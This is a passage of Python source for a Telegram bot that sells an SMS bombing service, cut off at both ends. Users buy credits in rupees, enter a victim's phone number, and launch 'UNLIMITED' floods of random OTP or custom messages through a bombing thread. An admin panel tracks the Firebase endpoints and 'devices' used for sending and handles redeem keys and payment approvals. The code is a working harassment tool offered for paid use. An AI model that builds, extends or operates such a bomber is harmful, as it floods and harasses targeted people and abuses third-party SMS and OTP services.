        return await update.effective_message.reply_text("❌ Yᴏᴜ Aʀᴇ Bᴀɴɴᴇᴅ. 🚫")
    if await check_maintenance(update, context): return
    if not await check_force_join(update, context): return
    try:
        video_url = random.choice(VIDEO_URLS)
        await update.effective_message.reply_video(
            video=video_url,
            caption="🔥 Wᴇʟᴄᴏᴍᴇ Tᴏ Sᴍs Bʟᴀsᴛ Bᴏᴛ 🚀",
            parse_mode="HTML", supports_streaming=True)
    except Exception as e:
        print(f"⚠️ Video error: {e}")
    ref = None
    if context.args and len(context.args) > 0:
        p = context.args[0]
        if p.startswith("ref_"):
            try: ref = int(p.split("_")[1])
            except: pass
    add_new_user(uid, ref)
    cr = get_user_credits(uid)
    try:
        user = await context.application.bot.get_chat(uid)
        username = f"@{user.username}" if user.username else "N/A"
    except: username = "N/A"
    role = "👑 Oᴡɴᴇʀ" if is_owner(uid) else "🆓 Fʀᴇᴇ Usᴇʀ"
    if not _cache_ready.is_set():
        _cache_ready.wait(timeout=3)
    cached = _device_cache["data"]
    total_devices = cached.get("total", 0)
    txt = (
        f"╔═════════════════════╗\n"
        f"║     📱 Sᴍs Bʟᴀsᴛ Bᴏᴛ   ║\n"
        f"║     Oᴡɴᴇʀ: {OWNER_USERNAME}    ║\n"
        f"║     ── ⋆⋅☆⋅⋆ ──                ║\n"
        f"║     👤 Rᴏʟᴇ    : {role}        ║\n"
        f"║     📛 Usᴇʀɴᴀᴍᴇ : {username}   ║\n"
        f"║     💰 Cʀᴇᴅɪᴛs : {cr}          ║\n"
        f"║     🔥 Aᴘɪs    : {len(FIREBASE_URLS)} ║\n"
        f"║     🔄 Dᴇᴠɪᴄᴇs : 🟢 {total_devices} ║\n"
        f"║     ── ⋆⋅☆⋅⋆ ──                ║\n"
        f"║     Tᴀᴘ Sᴇɴᴅ Sᴍs Tᴏ Sᴛᴀʀᴛ 🚀 ║\n"
        f"╚═════════════════════╝"
    )
    await update.effective_message.reply_text(txt, parse_mode="HTML", reply_markup=get_main_keyboard(uid))

# ---------- ADMIN PANEL ----------
async def admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.effective_user or not update.effective_message:
        return
    uid = update.effective_user.id
    if not is_owner(uid): return await update.effective_message.reply_text("⛔ Uɴᴀᴜᴛʜᴏʀɪᴢᴇᴅ 🚫")
    maint = "🟢 ON" if is_maintenance_on() else "🔴 OFF"
    markup = InlineKeyboardMarkup([
        [InlineKeyboardButton("🔑 Gᴇɴᴇʀᴀᴛᴇ Kᴇʏ", callback_data="admin_genkey")],
        [InlineKeyboardButton("📋 Lɪsᴛ Kᴇʏs", callback_data="admin_listkeys")],
        [InlineKeyboardButton("🗑 Dᴇʟᴇᴛᴇ Kᴇʏ", callback_data="admin_delkey")],
        [InlineKeyboardButton(f"🔧 Mᴀɪɴᴛᴇɴᴀɴᴄᴇ: {maint}", callback_data="admin_maint_toggle")],
        [InlineKeyboardButton("✏️ Sᴇᴛ Mᴀɪɴᴛ Mᴇssᴀɢᴇ", callback_data="admin_maint_msg")],
        [InlineKeyboardButton("📊 Dᴇᴠɪᴄᴇ Sᴛᴀᴛᴜs", callback_data="admin_devices")],
        [InlineKeyboardButton("👥 Usᴇʀs", callback_data="admin_users")],
        [InlineKeyboardButton("💰 Pᴇɴᴅɪɴɢ Pᴀʏᴍᴇɴᴛs", callback_data="admin_pending_pay")],
        [InlineKeyboardButton("📢 Bʀᴏᴀᴅᴄᴀsᴛ", callback_data="admin_broadcast_info")],
        [InlineKeyboardButton("💰 Aᴅᴅ Cʀᴇᴅɪᴛs", callback_data="admin_addcredits_info")],
        [InlineKeyboardButton("💸 Rᴇᴍᴏᴠᴇ Cʀᴇᴅɪᴛs", callback_data="admin_removecredits_info")],
        [InlineKeyboardButton("🚫 Bᴀɴ", callback_data="admin_ban_info")],
        [InlineKeyboardButton("✅ Uɴʙᴀɴ", callback_data="admin_unban_info")],
        [InlineKeyboardButton("🔄 Rᴇғʀᴇsʜ Cᴀᴄʜᴇ", callback_data="admin_refresh")],
        [InlineKeyboardButton("❌ Cʟᴏsᴇ", callback_data="admin_close")],
    ])
    await update.effective_message.reply_text(
        "⚙️ <b>ADMIN PANEL</b>\n━━━━━━━━━━━━━━\nChoose an option:",
        parse_mode="HTML", reply_markup=markup)

def _admin_panel_markup():
    maint = "🟢 ON" if is_maintenance_on() else "🔴 OFF"
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔑 Gᴇɴᴇʀᴀᴛᴇ Kᴇʏ", callback_data="admin_genkey")],
        [InlineKeyboardButton("📋 Lɪsᴛ Kᴇʏs", callback_data="admin_listkeys")],
        [InlineKeyboardButton("🗑 Dᴇʟᴇᴛᴇ Kᴇʏ", callback_data="admin_delkey")],
        [InlineKeyboardButton(f"🔧 Mᴀɪɴᴛᴇɴᴀɴᴄᴇ: {maint}", callback_data="admin_maint_toggle")],
        [InlineKeyboardButton("✏️ Sᴇᴛ Mᴀɪɴᴛ Mᴇssᴀɢᴇ", callback_data="admin_maint_msg")],
        [InlineKeyboardButton("📊 Dᴇᴠɪᴄᴇ Sᴛᴀᴛᴜs", callback_data="admin_devices")],
        [InlineKeyboardButton("👥 Usᴇʀs", callback_data="admin_users")],
        [InlineKeyboardButton("💰 Pᴇɴᴅɪɴɢ Pᴀʏᴍᴇɴᴛs", callback_data="admin_pending_pay")],
        [InlineKeyboardButton("📢 Bʀᴏᴀᴅᴄᴀsᴛ", callback_data="admin_broadcast_info")],
        [InlineKeyboardButton("💰 Aᴅᴅ Cʀᴇᴅɪᴛs", callback_data="admin_addcredits_info")],
        [InlineKeyboardButton("💸 Rᴇᴍᴏᴠᴇ Cʀᴇᴅɪᴛs", callback_data="admin_removecredits_info")],
        [InlineKeyboardButton("🚫 Bᴀɴ", callback_data="admin_ban_info")],
        [InlineKeyboardButton("✅ Uɴʙᴀɴ", callback_data="admin_unban_info")],
        [InlineKeyboardButton("🔄 Rᴇғʀᴇsʜ Cᴀᴄʜᴇ", callback_data="admin_refresh")],
        [InlineKeyboardButton("❌ Cʟᴏsᴇ", callback_data="admin_close")],
    ])

async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    if not q or not q.from_user: return
    uid = q.from_user.id; data = q.data
    if not is_owner(uid):
        try: await q.answer("⛔ Unauthorized", show_alert=True)
        except: pass
        return
    try: await q.answer()
    except: pass
    if data == "admin_close":
        try: await q.edit_message_text("❌ Aᴅᴍɪɴ Pᴀɴᴇʟ Cʟᴏsᴇᴅ.")
        except: pass
        return
    if data == "admin_genkey":
        context.user_data['admin_step'] = 'genkey_credits'
        try: await q.edit_message_text(
            "🔑 <b>Gᴇɴᴇʀᴀᴛᴇ Kᴇʏ</b>\n\nSᴇɴᴅ: <code>&lt;credits&gt; &lt;days&gt; &lt;max_uses&gt;</code>\n\nExᴀᴍᴘʟᴇ:\n<code>10 30 1</code>\n\n❌ /cancel",
            parse_mode="HTML")
        except: pass
        return
    if data == "admin_listkeys":
        keys = get_all_keys()
        if not keys:
            try: await q.edit_message_text("📭 Nᴏ Kᴇʏs")
            except: pass
            return
        msg = "🔑 <b>Rᴇᴄᴇɴᴛ Kᴇʏs:</b>\n━━━━━━━━━━━━━━\n"
        for k in keys:
            key, credits, max_uses, used_count, expiry_at = k
            ed = datetime.fromtimestamp(expiry_at).strftime("%d-%m-%Y")
            s = "✅" if used_count < max_uses else "❌"
            msg += f"{s} <code>{key}</code>\n   💰{credits} | {used_count}/{max_uses} | {ed}\n"
        try: await q.edit_message_text(msg, parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Bᴀᴄᴋ", callback_data="admin_back")]]))
        except: pass
        return
    if data == "admin_delkey":
        context.user_data['admin_step'] = 'delkey'
        try: await q.edit_message_text("🗑 <b>Dᴇʟᴇᴛᴇ Kᴇʏ</b>\n\nSᴇɴᴅ ᴋᴇʏ:\n<code>X4X-XXXX-XXXX</code>\n\n❌ /cancel", parse_mode="HTML")
        except: pass
        return
    if data == "admin_maint_toggle":
        new_state = not is_maintenance_on()
        set_maintenance(new_state)
        maint = "🟢 ON" if new_state else "🔴 OFF"
        try:
            await q.answer(f"Maintenance {maint}", show_alert=True)
            await q.edit_message_text(f"⚙️ <b>ADMIN PANEL</b>\n━━━━━━━━━━━━━━\nMaintenance: {maint}\nChoose:",
                parse_mode="HTML", reply_markup=_admin_panel_markup())
        except: pass
        return
    if data == "admin_maint_msg":
        context.user_data['admin_step'] = 'maint_msg'
        try: await q.edit_message_text("✏️ Sᴇɴᴅ ɴᴇᴡ ᴍᴀɪɴᴛᴇɴᴀɴᴄᴇ ᴍᴇssᴀɢᴇ:\n\n❌ /cancel", parse_mode="HTML")
        except: pass
        return
    if data == "admin_devices":
        refresh_device_cache_sync()
        d = _device_cache["data"]
        url_devices = d.get("url_devices", {})
        total = d.get("total", 0)
        working = d.get("urls", 0)
        working_list = [(url, devices) for url, devices in url_devices.items() if len(devices) > 0]
        working_list.sort(key=lambda x: len(x[1]), reverse=True)
        header = (
            f"📊 <b>DEVICE STATUS</b>\n"
            f"━━━━━━━━━━━━━━\n"
            f"✅ Working: {working}\n"
            f"🔄 Total: {total}\n"
            f"━━━━━━━━━━━━━━\n"
        )
        try: await q.edit_message_text(header, parse_mode="HTML")
        except: pass
        current_chunk = ""; chunk_num = 1
        for url, devices in working_list:
            count = len(devices)
            short_url = url.replace("https://", "").replace(".firebaseio.com", "")[:30]
            line = f"✅ {short_url}: {count}\n"
            if len(current_chunk) + len(line) > 3500:
                try:
                    await context.application.bot.send_message(
                        chat_id=uid,
                        text=f"<b>Part {chunk_num}</b>\n<code>{current_chunk}</code>",
                        parse_mode="HTML")
                except: pass
                chunk_num += 1; current_chunk = line
            else: current_chunk += line
        if current_chunk:
            try:
                await context.application.bot.send_message(
                    chat_id=uid,
                    text=f"<b>Part {chunk_num}</b>\n<code>{current_chunk}</code>",
                    parse_mode="HTML",
                    reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Bᴀᴄᴋ", callback_data="admin_back")]]))
            except: pass
        return
    if data == "admin_users":
        all_users = get_all_users(); total = len(all_users); banned = get_banned_count()
        msg = f"📊 <b>Usᴇʀs</b>\n👥 {total} | 🚫 {banned}\n━━━━━━━━━━━━━\n"
        for i, (uid2, cr, _) in enumerate(all_users[:30], 1):
            msg += f"{i}. <code>{uid2}</code> 💰{cr}\n"
        try: await q.edit_message_text(msg, parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Bᴀᴄᴋ", callback_data="admin_back")]]))
        except: pass
        return
    if data == "admin_pending_pay":
        conn = get_db(); c = conn.cursor()
        c.execute("SELECT id, user_id, amount, credits_given, transaction_id, screenshot_id FROM payments WHERE status='pending' ORDER BY id DESC LIMIT 20")
        rows = c.fetchall()
        if not rows:
            try: await q.edit_message_text("📭 Nᴏ Pᴇɴᴅɪɴɢ Pᴀʏᴍᴇɴᴛs",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Bᴀᴄᴋ", callback_data="admin_back")]]))
            except: pass
            return
        try: await q.edit_message_text(f"💰 <b>Pᴇɴᴅɪɴɢ:</b> {len(rows)}", parse_mode="HTML")
        except: pass
        for pid, tuid, amt, cr, txn, ss in rows:
            markup = InlineKeyboardMarkup([
                [InlineKeyboardButton("✅ Aᴘᴘʀᴏᴠᴇ", callback_data=f"pay_approve_{pid}"),
                 InlineKeyboardButton("❌ Rᴇᴊᴇᴄᴛ", callback_data=f"pay_reject_{pid}")]
            ])
            cap = (f"🆔 #{pid}\n👤 <code>{tuid}</code>\n💰 ₹{amt}\n💎 {cr}\n📝 {txn or 'SS'}")
            try:
                if ss:
                    await context.application.bot.send_photo(chat_id=uid, photo=ss, caption=cap,
                        parse_mode="HTML", reply_markup=markup)
                else:
                    await context.application.bot.send_message(chat_id=uid, text=cap,
                        parse_mode="HTML", reply_markup=markup)
            except: pass
            await asyncio.sleep(0.3)
        return
    if data in ["admin_broadcast_info", "admin_addcredits_info", "admin_removecredits_info", "admin_ban_info", "admin_unban_info"]:
        texts = {
            "admin_broadcast_info": ("📢 <b>Bʀᴏᴀᴅᴄᴀsᴛ</b>\n\n<code>/broadcast msg</code>", "admin_back"),
            "admin_addcredits_info": ("💰 <b>Aᴅᴅ Cʀᴇᴅɪᴛs</b>\n\n<code>/addcredits ID AMT</code>", "admin_back"),
            "admin_removecredits_info": ("💸 <b>Rᴇᴍᴏᴠᴇ Cʀᴇᴅɪᴛs</b>\n\n<code>/removecredits ID AMT</code>", "admin_back"),
            "admin_ban_info": ("🚫 <b>Bᴀɴ</b>\n\n<code>/ban ID</code>", "admin_back"),
            "admin_unban_info": ("✅ <b>Uɴʙᴀɴ</b>\n\n<code>/unban ID</code>", "admin_back"),
        }
        txt, back = texts[data]
        try: await q.edit_message_text(txt, parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Bᴀᴄᴋ", callback_data=back)]]))
        except: pass
        return
    if data == "admin_refresh":
        try:
            await q.answer("🔄 Refreshing...")
            refresh_device_cache_sync()
            await q.edit_message_text(
                f"✅ <b>Cᴀᴄʜᴇ Rᴇғʀᴇsʜᴇᴅ!</b>\n🔄 Devices: {_device_cache['data']['total']}\n✅ Working: {_device_cache['data']['urls']}/{len(FIREBASE_URLS)}",
                parse_mode="HTML",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Bᴀᴄᴋ", callback_data="admin_back")]]))
        except: pass
        return
    if data == "admin_back":
        maint = "🟢 ON" if is_maintenance_on() else "🔴 OFF"
        try: await q.edit_message_text(f"⚙️ <b>ADMIN PANEL</b>\n━━━━━━━━━━━━━━\nMaintenance: {maint}\nChoose:",
            parse_mode="HTML", reply_markup=_admin_panel_markup())
        except: pass
        return

async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.effective_user or not update.effective_message:
        return
    uid = update.effective_user.id
    text = (update.message.text or "").strip()
    if is_user_banned(uid):
        return await update.message.reply_text("❌ Bᴀɴɴᴇᴅ. 🚫")

    admin_step = context.user_data.get('admin_step')
    if admin_step and is_owner(uid):
        if admin_step == 'genkey_credits':
            parts = text.split()
            try:
                credits = int(parts[0])
                days = int(parts[1]) if len(parts) > 1 else 30
                max_uses = int(parts[2]) if len(parts) > 2 else 1
            except: return await update.message.reply_text("❌ Invalid!")
            key = generate_redeem_key(credits, days, max_uses, uid)
            context.user_data.pop('admin_step', None)
            return await update.message.reply_text(
                f"✅ <b>Kᴇʏ Gᴇɴᴇʀᴀᴛᴇᴅ!</b>\n━━━━━━━━━━━━━━\n🔑 <code>{key}</code>\n💰 {credits}\n📅 {days} days\n👥 {max_uses} uses",
                parse_mode="HTML")
        if admin_step == 'delkey':
            if delete_key(text):
                context.user_data.pop('admin_step', None)
                return await update.message.reply_text(f"✅ Deleted <code>{text.upper()}</code>", parse_mode="HTML")
            else: return await update.message.reply_text("❌ Not found!")
        if admin_step == 'maint_msg':
            set_maintenance(is_maintenance_on(), message=text)
            context.user_data.pop('admin_step', None)
            return await update.message.reply_text("✅ Message updated!", parse_mode="HTML")

    if await check_maintenance(update, context): return
    if text == BTN_ADMIN: return await admin_panel(update, context)
    if text == BTN_BUY:
        markup = InlineKeyboardMarkup([
            [InlineKeyboardButton("💬 Cᴏɴᴛᴀᴄᴛ Oᴡɴᴇʀ", url=OWNER_CONTACT_LINK)],
        ])
        return await update.message.reply_text(
            f"💳 <b>Bᴜʏ Pʀᴇᴍɪᴜᴍ</b>\n━━━━━━━━━━━━━━\n"
            f"👤 <b>Cᴏɴᴛᴀᴄᴛ:</b> {OWNER_CONTACT_USERNAME}\n"
            f"📱 <b>Pʜᴏɴᴇ:</b> <code>{OWNER_PHONE}</code>\n"
            f"🔗 <b>Lɪɴᴋ:</b> {OWNER_CONTACT_LINK}\n━━━━━━━━━━━━━━",
            parse_mode="HTML", reply_markup=markup)
    if text in [BTN_BOMB, BTN_CREDITS, BTN_REFERRAL, BTN_RECHARGE, BTN_HISTORY, BTN_STATUS, BTN_DEV, BTN_REDEEM]:
        if not await check_force_join(update, context): return
    if text == BTN_BOMB:
        for k in ('bulk_step','bulk_number','custom_message','stop_sending','is_custom_message'): context.user_data.pop(k, None)
        cr = get_user_credits(uid)
        if cr <= 0:
            return await update.message.reply_text("❌ Iɴsᴜғғɪᴄɪᴇɴᴛ Cʀᴇᴅɪᴛs! 💰", parse_mode="HTML")
        await update.message.reply_text("📞 <b>Eɴᴛᴇʀ Nᴜᴍʙᴇʀ:</b>\n+91XXXXXXXXXX\n❌ /cancel", parse_mode="HTML")
        context.user_data['bulk_step'] = 'number'
        return
    if text == BTN_CREDITS:
        for k in ('bulk_step','bulk_number','custom_message','stop_sending','is_custom_message'): context.user_data.pop(k, None)
        return await update.message.reply_text(f"💰 <b>Cʀᴇᴅɪᴛs:</b> <code>{get_user_credits(uid)}</code>", parse_mode="HTML")
    if text == BTN_REFERRAL:
        for k in ('bulk_step','bulk_number','custom_message','stop_sending','is_custom_message'): context.user_data.pop(k, None)
        bot_uname = (await context.application.bot.get_me()).username
        link = get_referral_link(uid, bot_uname)
        return await update.message.reply_text(f"🔗 <b>Lɪɴᴋ:</b>\n<code>{link}</code>\n\n🎁 <b>1 Cʀᴇᴅɪᴛ</b> Pᴇʀ Rᴇғᴇʀʀᴀʟ!", parse_mode="HTML")
    if text == BTN_RECHARGE:
        for k in ('bulk_step','bulk_number','custom_message','stop_sending','is_custom_message'): context.user_data.pop(k, None)
        markup = InlineKeyboardMarkup([
            [InlineKeyboardButton("💳 10 - ₹20", callback_data="recharge_10_20")],
            [InlineKeyboardButton("💎 25 - ₹50", callback_data="recharge_25_50")],
            [InlineKeyboardButton("🚀 50 - ₹100", callback_data="recharge_50_100")],
            [InlineKeyboardButton("👑 100 - ₹200", callback_data="recharge_100_200")],
            [InlineKeyboardButton("❌ Cᴀɴᴄᴇʟ", callback_data="recharge_cancel")]
        ])
        return await update.message.reply_text("💳 <b>Sᴇʟᴇᴄᴛ Pʟᴀɴ</b>", parse_mode="HTML", reply_markup=markup)
    if text == BTN_HISTORY:
        for k in ('bulk_step','bulk_number','custom_message','stop_sending','is_custom_message'): context.user_data.pop(k, None)
        hist = get_user_history(uid, 10)
        if not hist: return await update.message.reply_text("📭 Nᴏ Hɪsᴛᴏʀʏ.")
        reply = "📜 <b>Aᴄᴛɪᴠɪᴛʏ:</b>\n"
        for a, d, t in hist: reply += f"• {a} – {d[:30]}\n"
        return await update.message.reply_text(reply, parse_mode="HTML")
    if text == BTN_STATUS:
        for k in ('bulk_step','bulk_number','custom_message','stop_sending','is_custom_message'): context.user_data.pop(k, None)
        return await update.message.reply_text(
            f"🟢 <b>Bᴏᴛ Rᴜɴɴɪɴɢ</b> 🚀\n💰 Cʀᴇᴅɪᴛs: {get_user_credits(uid)}",
            parse_mode="HTML")
    if text == BTN_REDEEM:
        for k in ('bulk_step','bulk_number','custom_message','stop_sending','is_custom_message'): context.user_data.pop(k, None)
        return await update.message.reply_text("🔑 <b>Rᴇᴅᴇᴇᴍ</b>\n\nUsᴇ: <code>/redeem KEY</code>", parse_mode="HTML")
    if text == BTN_DEV:
        for k in ('bulk_step','bulk_number','custom_message','stop_sending','is_custom_message'): context.user_data.pop(k, None)
        return await update.message.reply_text(f"👨‍💻 Dᴇᴠ: {OWNER_CONTACT_LINK} 🔥", parse_mode="HTML")

    step = context.user_data.get('bulk_step')
    rstep = context.user_data.get('recharge_step')

    if step == 'number':
        valid, msg = validate_phone_number(text)
        if not valid: return await update.message.reply_text(f"{msg}", parse_mode="HTML")
        context.user_data['bulk_number'] = text
        markup = InlineKeyboardMarkup([
            [InlineKeyboardButton("🔢 Rᴀɴᴅᴏᴍ OTP", callback_data="msgtype_random")],
            [InlineKeyboardButton("✏ Cᴜsᴛᴏᴍ", callback_data="msgtype_custom")],
            [InlineKeyboardButton("❌ Cᴀɴᴄᴇʟ", callback_data="msgtype_cancel")]
        ])
        await update.message.reply_text("📝 Sᴇʟᴇᴄᴛ:", reply_markup=markup)
        context.user_data['bulk_step'] = 'msgtype'
        return

    if step == 'custom_msg':
        if not text: return await update.message.reply_text("❌ Eᴍᴘᴛʏ")
        context.user_data['custom_message'] = text
        context.user_data['is_custom_message'] = True
        if not deduct_credit(uid):
            return await update.message.reply_text("❌ Iɴsᴜғғɪᴄɪᴇɴᴛ Cʀᴇᴅɪᴛs. 💰")
        context.user_data.pop('bulk_step', None)
        log_user_action(uid, "Bulk SMS", f"Target: {context.user_data.get('bulk_number')}")
        start_bomb_thread(uid, context.user_data.get('bulk_number'), text)
        await update.message.reply_text(
            f"🚀 <b>Bᴏᴍʙ Sᴛᴀʀᴛᴇᴅ — UNLIMITED!</b>\n📱 {context.user_data.get('bulk_number')}\n\n✅ Sᴀʙ SMS ᴇᴋ sᴀᴀᴛʜ ᴊᴀᴀ ʀᴀʜᴇ ʜᴀɪɴ!\n📊 Lɪᴠᴇ ᴘʀᴏɢʀᴇss ᴅᴇᴋʜᴇɢᴀ!\n🛑 Rᴏᴋɴᴇ ᴋᴇ ʟɪʏᴇ /cancel",
            parse_mode="HTML")
        return

    # ---------- PAYMENT SUBMIT ----------
    if rstep == 'payment':
        if update.message.photo:
            fid = update.message.photo[-1].file_id
            cr = context.user_data.get('recharge_credits', 0)
            amt = context.user_data.get('recharge_amount', 0)
            if cr == 0: return await update.message.reply_text("❌ Exᴘɪʀᴇᴅ.")
            pid = create_payment(uid, amt, cr, ss=fid)
            await update.message.reply_text(
                f"✅ <b>Sᴄʀᴇᴇɴsʜᴏᴛ Sᴇɴᴛ!</b> 📸\n"
                f"🆔 Order: <code>#{pid}</code>\n"
                f"⏳ Aᴅᴍɪɴ ᴀᴘᴘʀᴏᴠᴀʟ ᴋᴀ ɪɴᴛᴇᴢᴀᴀʀ ᴋᴀʀᴏ...",
                parse_mode="HTML")
            try:
                markup = InlineKeyboardMarkup([
                    [InlineKeyboardButton("✅ Aᴘᴘʀᴏᴠᴇ", callback_data=f"pay_approve_{pid}"),
                     InlineKeyboardButton("❌ Rᴇᴊᴇᴄᴛ", callback_data=f"pay_reject_{pid}")]
                ])
                await context.application.bot.send_photo(
                    chat_id=get_owner_id(),
                    photo=fid,
                    caption=(
                        f"📥 <b>Nᴇᴡ Pᴀʏᴍᴇɴᴛ Rᴇǫᴜᴇsᴛ</b>\n"
                        f"━━━━━━━━━━━━━━\n"
                        f"🆔 Order: <code>#{pid}</code>\n"
                        f"👤 User: <code>{uid}</code>\n"
                        f"💰 Amount: ₹{amt}\n"
                        f"💎 Credits: {cr}\n"
                        f"━━━━━━━━━━━━━━"
                    ),
                    parse_mode="HTML", reply_markup=markup)
            except Exception as e:
                print(f"⚠️ Admin notify error: {e}")
            log_user_action(uid, "Recharge Req", f"{cr} credits ₹{amt} (ss)")
            for k in ('recharge_step','recharge_credits','recharge_amount'): context.user_data.pop(k, None)
            return
        elif text and not text.startswith('/'):
            cr = context.user_data.get('recharge_credits', 0)
            amt = context.user_data.get('recharge_amount', 0)
            if cr == 0: return await update.message.reply_text("❌ Exᴘɪʀᴇᴅ.")
            pid = create_payment(uid, amt, cr, txn=text)
            await update.message.reply_text(
                f"✅ <b>Tʀᴀɴsᴀᴄᴛɪᴏɴ Sᴇɴᴛ!</b> 💳\n"
                f"🆔 Order: <code>#{pid}</code>\n"
                f"⏳ Aᴅᴍɪɴ ᴀᴘᴘʀᴏᴠᴀʟ ᴋᴀ ɪɴᴛᴇᴢᴀᴀʀ ᴋᴀʀᴏ...",
                parse_mode="HTML")
            try:
                markup = InlineKeyboardMarkup([
                    [InlineKeyboardButton("✅ Aᴘᴘʀᴏᴠᴇ", callback_data=f"pay_approve_{pid}"),
                     InlineKeyboardButton("❌ Rᴇᴊᴇᴄᴛ", callback_data=f"pay_reject_{pid}")]
                ])
                await context.application.bot.send_message(
                    chat_id=get_owner_id(),
                    text=(
                        f"📥 <b>Nᴇᴡ Pᴀʏᴍᴇɴᴛ Rᴇǫᴜᴇsᴛ</b>\n"
                        f"━━━━━━━━━━━━━━\n"
                        f"🆔 Order: <code>#{pid}</code>\n"
                        f"👤 User: <code>{uid}</code>\n"
                        f"💰 Amount: ₹{amt}\n"
                        f"💎 Credits: {cr}\n"
                        f"📝 Txn: <code>{text}</code>\n"
                        f"━━━━━━━━━━━━━━"
                    ),
                    parse_mode="HTML", reply_markup=markup)
            except Exception as e:
                print(f"⚠️ Admin notify error: {e}")
            log_user_action(uid, "Recharge Req", f"{cr} credits ₹{amt} (txn)")
            for k in ('recharge_step','recharge_credits','recharge_amount'): context.user_data.pop(k, None)
            return
        return
    await update.message.reply_text("❌ Usᴇ Bᴜᴛᴛᴏɴs. 🔘")

# ---------- CALLBACKS ----------
async def handle_callbacks(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    if not q or not q.from_user: return
    data = q.data
    try: await q.answer()
    except: pass
    uid = q.from_user.id

    # ---------- PAYMENT APPROVE / REJECT ----------
    if data and (data.startswith("pay_approve_") or data.startswith("pay_reject_")):
        if not is_owner(uid):
            try: await q.answer("⛔ Unauthorized", show_alert=True)
            except: pass
            return
        action, pid_str = data.rsplit("_", 1)
        pid = int(pid_str)
        conn = get_db(); c = conn.cursor()
        c.execute("SELECT user_id, amount, credits_given, status FROM payments WHERE id=?", (pid,))
        row = c.fetchone()
        if not row:
            try: await q.edit_message_text("❌ Payment not found!")
            except: pass
            return
        target_uid, amt, cr, status = row
        if status != 'pending':
            try: await q.edit_message_text(f"⚠️ Already {status}!")
            except: pass
            return
        if action == "pay_approve":
            c.execute("UPDATE payments SET status='approved' WHERE id=?", (pid,))
            conn.commit()
            add_credits(target_uid, cr)
            try:
                await q.edit_message_caption(
                    caption=f"✅ <b>Aᴘᴘʀᴏᴠᴇᴅ</b>\n🆔 #{pid}\n👤 <code>{target_uid}</code>\n💎 +{cr} credits",
                    parse_mode="HTML")
            except:
                try: await q.edit_message_text(f"✅ Approved #{pid}\n💎 +{cr} to {target_uid}")
                except: pass
            try:
                await context.application.bot.send_message(
                    target_uid,
                    f"✅ <b>Pᴀʏᴍᴇɴᴛ Aᴘᴘʀᴏᴠᴇᴅ!</b>\n"
                    f"🆔 Order: <code>#{pid}</code>\n"
                    f"💰 ₹{amt}\n"
                    f"💎 +{cr} Cʀᴇᴅɪᴛs Aᴅᴅᴇᴅ!\n"
                    f"📊 Nᴇᴡ Bᴀʟᴀɴᴄᴇ: <code>{get_user_credits(target_uid)}</code>",
                    parse_mode="HTML")
            except: pass
            log_user_action(target_uid, "Recharge Approved", f"{cr} credits ₹{amt}")
        else:
            c.execute("UPDATE payments SET status='rejected' WHERE id=?", (pid,))
            conn.commit()
            try:
                await q.edit_message_caption(
                    caption=f"❌ <b>Rᴇᴊᴇᴄᴛᴇᴅ</b>\n🆔 #{pid}\n👤 <code>{target_uid}</code>",
                    parse_mode="HTML")
            except:
                try: await q.edit_message_text(f"❌ Rejected #{pid}")
                except: pass
            try:
                await context.application.bot.send_message(
                    target_uid,
                    f"❌ <b>Pᴀʏᴍᴇɴᴛ Rᴇᴊᴇᴄᴛᴇᴅ</b>\n"
                    f"🆔 Order: <code>#{pid}</code>\n"
                    f"💰 ₹{amt}\n"
                    f"📞 Cᴏɴᴛᴀᴄᴛ: {OWNER_CONTACT_USERNAME}",
                    parse_mode="HTML")
            except: pass
            log_user_action(target_uid, "Recharge Rejected", f"₹{amt}")
        return

    if data and data.startswith("admin_"):
        return await admin_callback(update, context)

    if data == "force_join_checked":
        try:
            member = await context.application.bot.get_chat_member(
                chat_id=f"@{FORCE_CHANNEL_USERNAME}", user_id=uid)
            if member.status in ("member", "administrator", "creator"):
                set_force_join_verified(uid)
                await q.edit_message_text("✅ Vᴇʀɪғɪᴇᴅ! 🎉\nTʏᴘᴇ /start")
            else:
                await q.edit_message_text(f"❌ Jᴏɪɴ Fɪʀsᴛ!\n{FORCE_CHANNEL_LINK}")
        except Exception as e:
            await q.edit_message_text(f"❌ {str(e)[:50]}\n{FORCE_CHANNEL_LINK}")
        return

    if not is_owner(uid):
        if await check_maintenance(update, context): return
        if not is_force_join_verified(uid):
            try:
                member = await context.application.bot.get_chat_member(
                    chat_id=f"@{FORCE_CHANNEL_USERNAME}", user_id=uid)
                if member.status not in ("member", "administrator", "creator"):
                    join_markup = InlineKeyboardMarkup([
                        [InlineKeyboardButton("📢 Jᴏɪɴ", url=FORCE_CHANNEL_LINK)],
                        [InlineKeyboardButton("✅ Dᴏɴᴇ", callback_data="force_join_checked")]
                    ])
                    await q.edit_message_text("⚠️ Jᴏɪɴ Rᴇǫᴜɪʀᴇᴅ!", reply_markup=join_markup)
                    return
                else: set_force_join_verified(uid)
            except:
                join_markup = InlineKeyboardMarkup([
                    [InlineKeyboardButton("📢 Jᴏɪɴ", url=FORCE_CHANNEL_LINK)],
                    [InlineKeyboardButton("✅ Dᴏɴᴇ", callback_data="force_join_checked")]
                ])
                await q.edit_message_text("⚠️ Jᴏɪɴ Rᴇǫᴜɪʀᴇᴅ!", reply_markup=join_markup)
                return

    if data.startswith("recharge_"):
        if data == "recharge_cancel":
            try: await q.edit_message_text("❌ Cᴀɴᴄᴇʟʟᴇᴅ.")
            except: pass
            return
        _, cr, amt = data.split("_")
        context.user_data['recharge_credits'] = int(cr)
        context.user_data['recharge_amount'] = int(amt)
        context.user_data['recharge_step'] = 'payment'
